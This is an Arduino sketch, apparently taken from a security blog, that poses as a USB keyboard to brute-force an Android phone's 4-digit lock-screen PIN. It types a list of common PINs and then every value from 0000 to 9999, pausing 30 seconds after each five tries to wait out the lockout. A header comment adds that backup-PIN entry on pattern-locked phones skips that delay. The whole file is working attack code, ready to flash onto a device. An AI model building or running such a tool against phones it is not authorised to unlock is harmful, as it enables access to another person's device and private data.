/* 
Brute forcing Android 4 Digit PIN's
To run the whole range it will take upwards of 16 hours because of
the 30 second delay after 5 bad inputs 
Intrestingly, if the target phone has the pattern enabled 
and the backup PIN set, the backup PIN entry system doesn't force the 30 second delay after
invalid attempts
http://blog.infosecsee.com */

const int buttonPin = 2;          // input pin for pushbutton
int previousButtonState = HIGH;   // for checking the state of a pushButton
int counter = 0;                  // button push counter
int check = 0;

void setup() {

  pinMode(buttonPin, INPUT);

  Keyboard.begin();
}

void loop() {

  int buttonState = digitalRead(buttonPin);
  if ((buttonState != previousButtonState) && (buttonState == HIGH)) {
    Mouse.move(25, 50, 0);
    String three = "000";
    String two = "00";
    String one = "0";

    while(counter < 10000){
      delay(1000);
      while (check < 1){
                Keyboard.println("1234");
                delay(500);
                Keyboard.println("1111");
                delay(500);
                Keyboard.println("0000");
                delay(500);
                Keyboard.println("1212");
                delay(500);
                Keyboard.println("7777");
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                Keyboard.println("1004");
                delay(500);
                Keyboard.println("2000");
                delay(500);
                Keyboard.println("4444");
                delay(500);
                Keyboard.println("2222");
                delay(500);
                Keyboard.println("6969");
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                Mouse.move(25, 50, 0);
                Keyboard.println("9999");
                delay(500);
                Keyboard.println("3333");
                delay(500);
                Keyboard.println("5555");
                delay(500);
                Keyboard.println("6666");
                delay(500);
                Keyboard.println("1122");
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                Keyboard.println("1313");
                delay(500);
                Keyboard.println("8888");
                delay(500);
                Keyboard.println("4321");
                delay(500);
                Keyboard.println("2001");
                delay(500);
                Keyboard.println("1010");
                delay(500);
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                check++;}
      if (counter < 10 && check == 1) {

                Keyboard.println(three + counter);
                delay(500);
                counter++;
                Keyboard.println(three + counter);
                delay(500);
                counter++;
                Keyboard.println(three + counter);
                delay(500);
                counter++;
                Keyboard.println(three + counter);
                delay(500);
                counter++;
                Keyboard.println(three + counter);
                delay(500);
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                }
      else if (counter < 100){
                Keyboard.println(two + counter);
                delay(500);
                counter++;
                Keyboard.println(two + counter);
                delay(500);
                counter++;
                Keyboard.println(two + counter);
                delay(500);
                counter++;
                Keyboard.println(two + counter);
                delay(500);
                counter++;
                Keyboard.println(two + counter);
                delay(500);
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                }
      else if (counter < 1000){
                Keyboard.println(one + counter);
                delay(500);
                counter++;
                Keyboard.println(one + counter);
                delay(500);
                counter++;
                Keyboard.println(one + counter);
                delay(500);
                counter++;
                Keyboard.println(one + counter);
                delay(500);
                counter++;
                Keyboard.println(one + counter);
                delay(500);
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                }
      else {
                Keyboard.println(counter);
                delay(500);
                counter++;
                Keyboard.println(counter);
                delay(500);
                counter++;
                Keyboard.println(counter);
                delay(500);
                counter++;
                Keyboard.println(counter);
                delay(500);
                counter++;
                Keyboard.println(counter);
                delay(500);
                Keyboard.println("");
                Keyboard.println("");
                delay(30000);
                Mouse.move(25, 50, 0);
                }   
    }       
    }
  previousButtonState = buttonState; 
}
